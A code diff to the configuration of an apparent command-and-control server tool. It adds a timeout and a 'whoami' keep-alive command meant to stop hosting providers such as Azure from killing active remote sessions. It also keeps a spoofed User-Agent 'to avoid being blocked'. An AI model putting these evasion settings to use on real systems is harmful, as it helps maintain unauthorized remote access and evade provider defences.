@@ -21,6 +21,32 @@ RESPONSE_KEY = "index"
 #Leave blank to Binding to all interfaces, Otherwise Enter C2 Servers IP Address
 BIND_ADDR = ""
 
+#Command to input timeout settings in seconds; 225 is right for Azure; set to None if not needed
+#INPUT_TIMEOUT = 225
+INPUT_TIMEOUT = None
+
+"""Detect OS to Run below commands automatically to prevent against Azure, and other hosting environment 
+from killing our Active Session,
+[*] change KEEP_ALIVE_CMD value to command you want run to keep active session"""
+KEEP_ALIVE_CMD = "whoami"
+
+# KEEP_ALIVE_CMD based on OS
+#
+# from platform import system
+#
+# # set KEEP_ALIVE_CMD's value for Windows Builds only
+# if system() == "Windows":
+#     # get current time based on 24-hour clock(military time)
+#     KEEP_ALIVE_CMD = "time /T"
+#
+# # set KEEP_ALIVE_CMD's value for Linux Builds only
+# elif system() == "Linux":
+#     # get current time based on 24-hour clock(military time)
+#     KEEP_ALIVE_CMD = "date +%R" #Linux Builds
+# # set KEEP_ALIVE_CMD's value on 'cd' for other Builds to prevent against timeout
+# else:
+#     KEEP_ALIVE_CMD = "cd"
+
 # We should change User-Agent to avoid being blocked, But other keys is Optional
 HEADERS = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/129.0.0.0 Safari/537.36"}
